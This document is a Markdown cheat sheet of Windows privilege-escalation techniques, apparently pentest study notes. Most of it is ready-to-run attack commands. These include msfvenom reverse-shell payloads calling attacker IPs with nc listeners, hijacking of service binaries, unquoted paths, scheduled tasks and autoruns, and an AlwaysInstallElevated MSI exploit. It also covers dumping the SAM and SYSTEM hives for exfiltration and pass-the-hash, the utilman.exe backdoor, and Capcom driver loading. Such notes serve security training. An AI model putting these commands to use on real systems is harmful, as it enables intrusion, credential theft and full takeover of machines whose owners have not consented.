# Information Gathering
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

## Users, groups
```powershell
whoami
whoami /groups

# PowerShell
Get-LocalUser
Get-LocalGroup

Get-LocalGroupMember <group>
Get-LocalGroupMember Administrators
```

## Operating system
```powershell
systeminfo
```

## Network informations
```powershell
# Network configuration
ipconfig /all

# Routing table
route print

# Active network connections
netstat -ano
```

## Installed Applications
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## Running Processes
```powershell
Get-Process

# More infos on a process
Get-Process <name> | Format-List *
```

# Files
## Find sensitive files
```powershell
# Keepass db
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# TXT, INI files in Xampp folder
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Files in users directory
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### Console History file

```powershell
(Get-PSReadlineOption).HistorySavePath

# other way
type C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

# Windows Services
- Hijack service binaries
- Hijack service DLLs
- Abuse Unquoted service paths
- PowerUp
	- `Get-ModifiableServiceFile`

```powershell
# List of services with binary path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Permissions
icacls <path>

# PowerUp
. .\PowerUp.ps1
Get-ModifiableServiceFile

# on attacker
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.191 LPORT=4242 -f exe

# on victim : grab the exe from attacker and replace the service executable
# restart the service
Restart-Service BackupMonitor
```

# DLL Hijacking

- Enumerate services
- Check permissions
- Identify missing DLL with procmon

```powershell
# enumerate services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# get permissions
icacls.exe <path>
```

- In procmon.exe
```
Filter > 
Process Name is <executable name>
Result contains NOT FOUND
Path contains dll
```

# Unquoted service path

>We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.
>Tool : https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# exemple
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                          
BetaService                                C:\Users\steve\Documents\BetaServ.exe                                             
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

# verifu permissions on the repository
icacls <path>

# Current.exe is a malicious file
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
Start-Service GammaService

# with PowerUp
. .\PowerUp.ps1
Get-UnquotedService
```

# Scheduled tasks
- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

```powershell
# List Scheduled tasks
schtasks /query /fo LIST /v

# check tasktorun

# check permissions to modify the executable ?
icacls <path>

# move your malicious file to the location
mv .\adduser.exe <path>

# wait for the scheduled task to be executed
```

# AlwaysInstallElevated
## Detect
```powershell
# Check if these registry values are set to "1".
# cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# powershell
Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installerpowe
```

>These registry keys tell windows that a user of any privilege can install .msi files are NT AUTHORITY\SYSTEM. So all you need to do is create a malicious .msi file, and run it.

## Exploit
```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=$attacker_ip LPORT=443 -f msi -o rev.msi
python -m SimpleHTTPServer 80

# on the windows victim
powershell wget http://$attacker_ip/rev.msi

# on attacker
nc -lvnp 443

# on victim
msiexec /quiet /qn /i rev.msi
```

# RegistryAutoruns
>Logon Autostart Execution through Registry Run Keys is a Windows feature that enables specific programs or scripts to launch automatically when a user logs into the system. This feature allows these programs or scripts to launch automatically without any manual action from the user when the operating system starts up.
>Attackers may exploit the Logon Autostart Execution feature by inserting malicious software into the Registry Run Keys. This enables the malicious code to automatically launch during system startup, potentially granting it elevated privileges.

## Detect
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
- Identify the path
## Exploit
```bash
# transfer the shell.exe to victim
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe

# open listener
nc -lvnp 1234
```
- Move the malicious executable file to the path, rename the shell.exe to the application.exe
- Reboot victim's machine

# Credentials Manager
>The Credentials Manager is a feature in Windows that securely stores usernames and passwords for websites, applications, and network resources. This component is particularly helpful for users who want to manage and retrieve their login information easily without having to remember each set of credentials.
>In a scenario where an attacker has compromised an account with access to the Windows Credentials Manager and has obtained stored credentials from an elevated account, he can potentially use the "runas" command to elevate his privileges and gain unauthorized access.

## Detect
```powershell
cmdkey /list
```

## Exploit
```bash
# Create a malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.exe
# Transfer it to victim
# Set up listener
nc -lvnp 1234
```

```powershell
# On victim
runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Tasks\nikos.exe"
```

# Abusing tokens
>More : https://github.com/gtworek/Priv2Admin
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege
- SeSystemtime

## SeImpersonate
>Similarly to `SeAssignPrimaryToken`, allows by design to create a process under the security context of another user (using a handle to a token of said user).
>Multiple tools and techniques may be used to obtain the required token :
>- _Potato family_ (potato.exe, RottenPotato, RottenPotatoNG, Juicy Potato, SweetPotato, RemotePotato0), RogueWinRM, PrintSpoofer, etc.

```powershell
# Check privileges
whoami /priv

# Exploit it
.\PrintSpoofer64.exe -i -c powershell.exe
```

## SeAssignPrimary
>It is very similar to **SeImpersonatePrivilege**, it will use the **same method** to get a privileged token. Then, this privilege allows **to assign a primary token** to a new/suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx). With the token, you can create a **new process** with 'CreateProcessAsUser' or create a process suspended and **set the token** (in general, you cannot modify the primary token of a running process).
>Tools :
>- _potato.exe, rottenpotato.exe and juicypotato.exe_

## SeTcb
>If you have enabled this token you can use **KERB_S4U_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** (admins) to the token, set the **integrity level** of the token to "**medium**", and assign this token to the **current thread** (SetThreadToken).
>Tool : https://github.com/gtworek/PSBits/tree/master/VirtualAccounts

### Exploitation path
Manipulate tokens to have local admin rights included.
```powershell
# Check privileges
whoami /priv
```

## SeBackup
>The system is caused to **grant all read access** control to any file (limited to read operations) by this privilege. It is utilized for **reading the password hashes of local Administrator** accounts from the registry, following which, tools like "**psexec**" or "**wmiexec**" can be used with the hash (Pass-the-Hash technique). However, this technique fails under two conditions: when the Local Administrator account is disabled, or when a policy is in place that removes administrative rights from Local Administrators connecting remotely.
>Tool : https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1

### Exploitation Path
1. Enable the privilege in the token
2. Export the `HKLM\SAM` and `HKLM\SYSTEM` registry hives:
`cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"`
3. Eventually transfer the exported hives on a controlled computer
4. Extract the local accounts hashes from the export `SAM` hive. For example using `Impacket`'s `secretsdump.py` Python script:  
`secretsdump.py -sam SAM -system SYSTEM LOCAL` 
5. Authenticate as the local built-in `Administrator`, or another member of the local `Administrators` group, using its `NTLM` hash (Pass-the-Hash). For example using `Impacket`'s `psexec.py` Python script:
`psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>`
Alternatively, can be used to read sensitive files with `robocopy /b`

```powershell
# Check privileges
whoami /priv

# Craft diskshadow txt file
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

# execute with diskshadow.exe, to have a shadow copy
diskshadow.exe /s c:\temp\diskshadow.txt

# Now that the shadow copy has been successfully created and exposed as Z:, we can use the following **robocopy** commands to extract a copy of the SYSTEM and SAM files from Z:\windows\system32\config:
robocopy /b Z:\Windows\System32\Config C:\temp SAM 
robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM

# exfiltrate !!
```

## SeRestore
>Permission for **write access** to any system file, irrespective of the file's Access Control List (ACL), is provided by this privilege. It opens up numerous possibilities for escalation, including the ability to **modify services**, perform DLL Hijacking, and set **debuggers** via Image File Execution Options among various other techniques.

### Exploitation path
1. Launch PowerShell/ISE with the SeRestore privilege present.  
2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).  
3. Rename utilman.exe to utilman.old  
4. Rename cmd.exe to utilman.exe  
5. Lock the console and press Win+U

## SeCreateToken
>SeCreateTokenPrivilege is a powerful permission, especially useful when a user possesses the ability to impersonate tokens, but also in the absence of SeImpersonatePrivilege. This capability hinges on the ability to impersonate a token that represents the same user and whose integrity level does not exceed that of the current process.
>Tool : https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeCreateTokenPrivilegePoC

## SeLoadDriver
>This privilege allows to **load and unload device drivers** with the creation of a registry entry with specific values for `ImagePath` and `Type`. Since direct write access to `HKLM` (HKEY_LOCAL_MACHINE) is restricted, `HKCU` (HKEY_CURRENT_USER) must be utilized instead. However, to make `HKCU` recognizable to the kernel for driver configuration, a specific path must be followed.
>This path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, where `<RID>` is the Relative Identifier of the current user. Inside `HKCU`, this entire path must be created, and two values need to be set:
>- `ImagePath`, which is the path to the binary to be executed
>- `Type`, with a value of `SERVICE_KERNEL_DRIVER` (`0x00000001`).

### Exploitation path
Upload the driver [eoploaddriver_x64.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/eoploaddriver_x64.exe), [Capcom.sys file](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/Capcom.sys), [ExploitCapcom.exe](https://github.com/k4sth4/SeLoadDriverPrivilege/blob/main/ExploitCapcom.exe) on traget machine under writable directory.
```powershell
# For the Capcom driver
# Load it
sc create Capcom type= kernel binPath= C:\Users\user\Desktop\Capcom.sys
sc start Capcom

.\ExploitCapcom.exe LOAD C:\\Temp\\Capcom.sys
.\ExploitCapcom.exe EXPLOIT whoami

# Generate revshell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe > shell.exe
.\ExploitCapcom.exe EXPLOIT shell.exe
```

## SeTakeOwnership
>The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges. For example, search for a service running as SYSTEM and take ownership of the service’s executable.

### Exploitation path
1. `takeown.exe /f "%windir%\system32"`  
2. `icacls.exe "%windir%\system32" /grant "%username%":F`  
3. Rename cmd.exe to utilman.exe  
4. Lock the console and press Win+U

## SeDebugPrivilege

### Exploitation path
Duplicate the `lsass.exe` token -> https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1

## SeSystemtime

### Exploitation path
```powershell
cmd.exe /c date 01-01-01
cmd.exe /c time 00:00
```

# Automated enumeration
- [Windows Exploit Suggester Next-Gen](https://github.com/bitsadmin/wesng)
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855)
- [SeatBelt](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
